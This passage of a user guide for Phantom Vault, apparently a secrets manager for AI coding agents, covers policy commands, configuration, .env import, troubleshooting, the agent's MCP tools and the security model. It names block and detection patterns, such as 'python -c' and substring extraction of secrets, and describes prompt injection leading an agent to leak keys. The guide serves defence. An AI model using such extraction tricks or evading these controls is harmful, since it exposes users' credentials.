ryan@macbook ~ % phantom policy allow-domain api.elevenlabs.io

  ✓ Added api.elevenlabs.io to allowed domains
  ✓ Policy re-signed
```

### Block a Custom Pattern

```
ryan@macbook ~ % phantom policy block-pattern 'python -c'

  ✓ Added block pattern: 'python -c'
  ✓ Policy re-signed

  Note: This blocks all Python one-liners. vault_run commands
  containing 'python -c' will be rejected.
```

### Verify Policy Integrity

```
ryan@macbook ~ % phantom policy verify

  ✓ Policy HMAC: valid
  ✓ Policy has not been tampered with since last modification
  ✓ Last modified: 2026-02-27 14:32:01 UTC
```

### Reset to Defaults

```
ryan@macbook ~ % phantom policy reset

  ⚠ This will reset your policy to secure defaults.
  All custom allowed domains and patterns will be removed.

  Proceed? [y/N]: y

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Policy reset to defaults
  ✓ Policy re-signed
```

---

## 12. Configuration

All settings live in `~/.phantom/config.toml`. You can edit this file directly with any text editor, or use CLI commands.

### View Current Config

```
ryan@macbook ~ % cat ~/.phantom/config.toml

[server]
idle_timeout_minutes = 15       # Auto-lock vault after 15 min inactive
max_runs_per_minute = 10        # Rate limit for vault_run
require_biometric = true        # Require Touch ID / biometric

[namespaces]
default = "personal"            # Default namespace for new secrets
allowed = ["personal", "ib365", "advancedpsych"]

[sensitivity]
# Secrets marked "high" require human confirmation for AI access
high = ["DATABASE_URL", "STRIPE_SECRET_KEY", "CLERK_SECRET_KEY"]
medium = ["RAILWAY_TOKEN", "VERCEL_TOKEN"]
low = ["ELEVENLABS_API_KEY"]

[rotation]
warn_at_days = 60               # Warning when secret is this old
critical_at_days = 90           # Critical warning threshold

[canary]
auto_create = true              # Auto-plant canaries in new namespaces
webhook_url = ""                # Alert URL (Slack, email, etc.)

[sandbox]
default_timeout_seconds = 30    # Max command execution time
network_filtering = true        # Enable per-process network rules
```

### What Each Setting Does

| Setting | What It Does | Default |
|---------|-------------|---------|
| `idle_timeout_minutes` | Lock the vault after this many minutes of no activity | 15 |
| `max_runs_per_minute` | Maximum vault_run calls per minute (prevents rapid probing) | 10 |
| `require_biometric` | Whether Touch ID / biometric is required | true |
| `default` namespace | Which namespace new secrets go into | "personal" |
| `allowed` namespaces | Which namespaces can be created and accessed | (list) |
| `sensitivity.high` | Secrets that require human confirmation for AI access | (list) |
| `warn_at_days` | Days before health check warns about secret age | 60 |
| `critical_at_days` | Days before critical warning about secret age | 90 |
| `auto_create` canaries | Automatically plant canary secrets in new namespaces | true |
| `webhook_url` | URL to send canary trigger alerts | (empty) |
| `default_timeout_seconds` | Max time for vault_run commands | 30 |
| `network_filtering` | Enable per-process network sandbox | true |

### File Locations

```
~/.phantom/
├── vault.db        ← Encrypted secret storage (SQLite)
├── config.toml     ← Configuration (the file shown above)
├── audit.db        ← HMAC-chained audit log
├── policy.yaml     ← Command analysis policy (HMAC-signed)
└── canaries/       ← Canary secret configuration
```

### Environment Variables

You can override settings with environment variables:

| Variable | What It Does |
|----------|-------------|
| `PHANTOM_HOME` | Override config directory (default: `~/.phantom`) |
| `PHANTOM_NAMESPACE` | Override default namespace for current session |
| `PHANTOM_LOG_LEVEL` | Logging verbosity: error, warn, info, debug, trace |
| `PHANTOM_NO_COLOR` | Set to `1` to disable colored terminal output |

```
ryan@macbook ~ % PHANTOM_NAMESPACE=ib365 phantom list

  SECRETS IN NAMESPACE: ib365
  (lists ib365 secrets without needing --namespace flag)
```

---

## 13. Migrating from .env Files

If you currently have secrets in `.env` files (most developers do), here's how to migrate.

### Import All Keys from a .env File

```
ryan@macbook ~ % phantom import --file .env

  Reading .env file...

  Found 8 secrets:
    STRIPE_SECRET_KEY
    STRIPE_PUBLISHABLE_KEY
    CLERK_SECRET_KEY
    CLERK_PUBLISHABLE_KEY
    DATABASE_URL
    RAILWAY_TOKEN
    ELEVENLABS_API_KEY
    NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY

  Import all 8 secrets into namespace 'default'? [Y/n]: y

  ✓ Imported 8 secrets
  ✓ Audit log updated

  ⚠ IMPORTANT: Now delete your .env file:
    rm .env

  ⚠ Add .env to your .gitignore if not already:
    echo '.env' >> .gitignore
```

### Import into a Specific Namespace

```
ryan@macbook ~ % phantom import --file .env --namespace ib365

  ✓ Imported 8 secrets into namespace 'ib365'
```

### Import with Tags

```
ryan@macbook ~ % phantom import --file .env.production --namespace ib365 --tags prod

  ✓ Imported 8 secrets into namespace 'ib365' with tag 'prod'
```

---

## 14. Team Setup

Each team member runs their own Phantom Vault. Secrets are not shared between vaults — each person stores their own copy of the keys they need. This is intentional: shared vaults create shared risk.

### New Team Member Onboarding

Have each new team member run these commands:

```
# 1. Install Phantom Vault
ryan@macbook ~ % brew tap phantomvault/tap && brew install phantom-vault

# 2. Initialize their vault
ryan@macbook ~ % phantom init

# 3. Create project namespaces
ryan@macbook ~ % phantom namespace create ib365
ryan@macbook ~ % phantom namespace create advancedpsych

# 4. Add their secrets (provided by team lead securely)
ryan@macbook ~ % phantom add STRIPE_SECRET_KEY --namespace ib365 --sensitivity high
ryan@macbook ~ % phantom add DATABASE_URL --namespace ib365 --sensitivity high
ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365 --sensitivity high
ryan@macbook ~ % phantom add RAILWAY_TOKEN --namespace ib365 --sensitivity medium

# 5. Connect to Claude Code
ryan@macbook ~ % phantom mcp install

# 6. Restart Claude Code — done
```

---

## 15. Troubleshooting

### "phantom: command not found"

```
ryan@macbook ~ % phantom --version
zsh: command not found: phantom
```

**Fix:** The binary isn't in your PATH. Try:

```
ryan@macbook ~ % export PATH="$PATH:/usr/local/bin"
ryan@macbook ~ % phantom --version
phantom-vault 1.0.0
```

To make this permanent, add the export line to your `~/.zshrc` (Mac) or `~/.bashrc` (Linux).

### Touch ID Not Appearing

**Fix:** Your terminal app needs biometric permission. Go to:
System Preferences → Privacy & Security → Touch ID & Passwords → Terminal (enable it)

### vault_run Returns BLOCKED for a Legitimate Command

```
ryan@macbook ~ % phantom run --keys KEY --dry-run -- your-command-here

  Analysis result: ✗ BLOCKED
  Reason: ...
```

**Fix:** If it's a false positive, add the command pattern to your allowed list:

```
ryan@macbook ~ % phantom policy allow-domain needed-domain.com
```

### MCP Server Not Connecting

```
ryan@macbook ~ % phantom mcp status
  Configuration: ✗ Not found in settings
```

**Fix:**

```
ryan@macbook ~ % phantom mcp install
# Then restart Claude Code
```

### Rate Limit Exceeded

```
  ✗ Rate limit exceeded: 10 vault_run calls per minute
  Wait 47 seconds or increase limit in config.toml
```

**Fix:** Wait, or increase the limit:

```
# Edit ~/.phantom/config.toml
max_runs_per_minute = 20
```

### Vault Locked (Timeout)

```
  ✗ Vault is locked (idle timeout)
  Unlock with: phantom unlock
```

**Fix:**

```
ryan@macbook ~ % phantom unlock
[Touch ID prompt]
✓ Vault unlocked
```

---

## 16. Complete Command Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  PHANTOM VAULT — QUICK REFERENCE                                            │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  SETUP                                                                       │
│  phantom init                          Create your vault                     │
│  phantom mcp install                   Connect to Claude Code                │
│                                                                              │
│  SECRETS                                                                     │
│  phantom add KEY_NAME                  Store a new secret                    │
│  phantom list                          List all secrets (names only)         │
│  phantom show KEY_NAME                 Show details + last 4 chars           │
│  phantom get KEY_NAME                  Get full value (human only)           │
│  phantom remove KEY_NAME               Delete a secret                       │
│  phantom import --file .env            Import from .env file                 │
│                                                                              │
│  RUNNING COMMANDS                                                            │
│  phantom run --keys K -- cmd           Run command with secret injected      │
│  phantom run --dry-run --keys K -- cmd Check if command would be allowed     │
│                                                                              │
│  NAMESPACES                                                                  │
│  phantom namespace create NAME         Create a namespace                    │
│  phantom namespace list                List all namespaces                   │
│  phantom namespace switch NAME         Change default namespace              │
│  phantom namespace delete NAME         Delete a namespace                    │
│                                                                              │
│  HEALTH & ROTATION                                                           │
│  phantom health                        Check vault and secret health         │
│  phantom rotate KEY_NAME               Rotate a secret                       │
│                                                                              │
│  AUDIT                                                                       │
│  phantom audit tail                    View recent activity                  │
│  phantom audit verify                  Check log integrity                   │
│  phantom audit search --key KEY        Find entries for a secret             │
│  phantom audit export --format json    Export log                            │
│                                                                              │
│  CANARIES                                                                    │
│  phantom canary create                 Plant a honeypot secret               │
│  phantom canary list                   List canary secrets                   │
│  phantom canary status                 Check for triggered canaries          │
│  phantom canary set-webhook URL        Set alert destination                 │
│                                                                              │
│  POLICY                                                                      │
│  phantom policy show                   View current rules                    │
│  phantom policy allow-domain DOMAIN    Allow a network domain                │
│  phantom policy verify                 Check policy integrity                │
│  phantom policy reset                  Reset to secure defaults              │
│                                                                              │
│  HELP                                                                        │
│  phantom --help                        Full command listing                  │
│  phantom <command> --help              Help for any command                  │
│  phantom --version                     Show version                          │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 17. What Your AI Agent Sees (MCP Tools)

When Claude Code connects to Phantom Vault, it gets access to exactly 6 tools. Here's what each one returns:

### vault_list

**What Claude sees:**

```json
[
  {
    "name": "STRIPE_SECRET_KEY",
    "namespace": "default",
    "created": "2026-02-27",
    "expires": null,
    "sensitivity": "medium",
    "tags": ["payments"],
    "access_count": 3
  }
]
```

**What Claude does NOT see:** The actual key value. Ever.

### vault_exists

**What Claude sees:**

```json
{
  "exists": true,
  "name": "STRIPE_SECRET_KEY",
  "namespace": "default"
}
```

### vault_masked

**What Claude sees:**

```json
{
  "name": "STRIPE_SECRET_KEY",
  "masked": "••••••••••••rXYZ"
}
```

Only the last 4 characters. Enough to confirm which key, not enough to use it.

### vault_run

**What Claude sees (successful command):**

```json
{
  "exit_code": 0,
  "stdout": "Deploy successful. Live at https://myapp.railway.app",
  "stderr": "",
  "duration_ms": 4200,
  "redactions": 0
}
```

**What Claude sees (if the secret leaked in output):**

```json
{
  "exit_code": 0,
  "stdout": "Connected with key [REDACTED:STRIPE_SECRET_KEY]",
  "stderr": "",
  "duration_ms": 1200,
  "redactions": 1
}
```

**What Claude sees (blocked command):**

```json
{
  "error": "BLOCKED",
  "reason": "Oracle attack: substring extraction detected (${VAR:0:1})",
  "category": "SUBSTRING_EXTRACTION",
  "risk_score": 100
}
```

### vault_health

```json
{
  "secrets_total": 5,
  "warnings": [
    {"name": "DATABASE_URL", "issue": "expires in 12 days"},
    {"name": "CLERK_KEY", "issue": "95 days old, rotation recommended"}
  ],
  "canaries_active": 3,
  "canaries_triggered": 0,
  "audit_chain_valid": true
}
```

### vault_rotate

```json
{
  "status": "pending_human_approval",
  "message": "Rotation for STRIPE_SECRET_KEY requires biometric confirmation via CLI. Run: phantom rotate STRIPE_SECRET_KEY"
}
```

The AI agent **cannot** rotate secrets on its own. It can request rotation, but you must approve it with Touch ID in your terminal.

---

## 18. Security Model (Plain English)

### The Problem

When you use an AI coding assistant, it can read your `.env` files. That means your Stripe key, your database password, your Clerk secret — all visible to the AI. If the AI's conversation is logged, cached, or used for training, your keys go with it. If the AI is tricked by a prompt injection attack, it could send your keys to an attacker.

### The Solution: 5 Layers of Defense

**Layer 0 — Your encryption key lives in hardware.**
On Apple Silicon Macs, the key that encrypts your vault is generated inside the Secure Enclave — a dedicated security chip. It physically cannot be extracted. Not by software, not by the operating system, not by anyone. You unlock it with your fingerprint.

**Layer 1 — Your secrets are double-encrypted.**
Each secret is encrypted with two different algorithms (AES-256-GCM and XChaCha20-Poly1305). Each encryption uses a unique random number. The encrypted data sits in an SQLite database with strict file permissions. The memory holding your secrets is locked (can't be swapped to disk) and zeroed when done.

**Layer 2 — Commands run in a sandbox.**
When a command needs your secret, it runs in an isolated process that can only connect to approved servers. The secret exists only as an environment variable in that process. When the process ends, the memory is wiped.

**Layer 3 — Output is scanned before the AI sees it.**
Before any command output goes back to the AI, Phantom scans it for your secret in 15+ formats: the original text, Base64 encoded, URL encoded, hex, HTML entities, reversed, ROT13, and more. If any trace is found, it's replaced with [REDACTED]. If the scan itself fails, the output is blocked entirely — it never passes through raw.

**Layer 4 — Everything is logged and monitored.**
Every access is recorded in a tamper-evident audit trail. Fake "canary" secrets detect probing. Anomalous patterns trigger alerts. If someone modifies the log, the integrity chain breaks and you'll know.

### What Makes This Different from a Password Manager

A password manager (1Password, Bitwarden) stores secrets and gives them back to you when you ask. Phantom Vault stores secrets and **uses them on your behalf** without ever giving them back. The AI agent never receives the secret — it only receives the result of a command that used the secret, after that result has been scanned and sanitized.

---

*Phantom Vault is open source under the Apache 2.0 license.*
*Report issues at github.com/phantomvault/phantom-vault*
